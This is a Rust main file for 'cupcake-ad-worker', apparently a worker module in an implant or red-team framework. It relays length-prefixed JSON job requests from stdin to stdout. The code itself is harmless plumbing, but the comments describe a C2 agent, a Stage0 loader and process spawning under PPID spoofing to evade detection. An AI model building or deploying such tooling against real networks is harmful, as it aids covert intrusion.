//! cupcake-ad-worker — short-lived PE.
//!
//! stdin:  u32le len + AdJobRequest JSON
//! stdout: u32le len + AdJobResponse JSON
//!
//! No C2 network. Stage0 must never map this image into the agent process.
//!
//! Console subsystem (not `windows`) so pipe-based CreateProcess job I/O is reliable
//! under PPID-spoofed spawn used by ModuleSupervisor.

use cupcake_ad_worker::{decode_request_frame, encode_response_frame, handle_ad_job, AdJobResponse};
use std::io::{Read, Write};

fn main() {
    let _ = std::panic::catch_unwind(|| {
        if let Err(e) = run() {
            let resp = AdJobResponse {
                request_id: String::new(),
                status: "error".into(),
                stdout: String::new(),
                stderr: e,
                error_code: "worker_error".into(),
            };
            if let Ok(frame) = encode_response_frame(&resp) {
                let _ = std::io::stdout().write_all(&frame);
                let _ = std::io::stdout().flush();
            }
        }
    });
}

fn run() -> Result<(), String> {
    let mut stdin = std::io::stdin();
    let mut hdr = [0u8; 4];
    stdin
        .read_exact(&mut hdr)
        .map_err(|e| format!("read len: {e}"))?;
    let len = u32::from_le_bytes(hdr) as usize;
    if len > 8 * 1024 * 1024 {
        return Err("request too large".into());
    }
    let mut body = vec![0u8; len];
    if len > 0 {
        stdin
            .read_exact(&mut body)
            .map_err(|e| format!("read body: {e}"))?;
    }
    let mut frame = Vec::with_capacity(4 + body.len());
    frame.extend_from_slice(&hdr);
    frame.extend_from_slice(&body);
    let req = decode_request_frame(&frame)?;
    let resp = handle_ad_job(&req);
    let out = encode_response_frame(&resp)?;
    let mut stdout = std::io::stdout();
    stdout
        .write_all(&out)
        .map_err(|e| format!("write resp: {e}"))?;
    stdout.flush().map_err(|e| format!("flush: {e}"))?;
    Ok(())
}
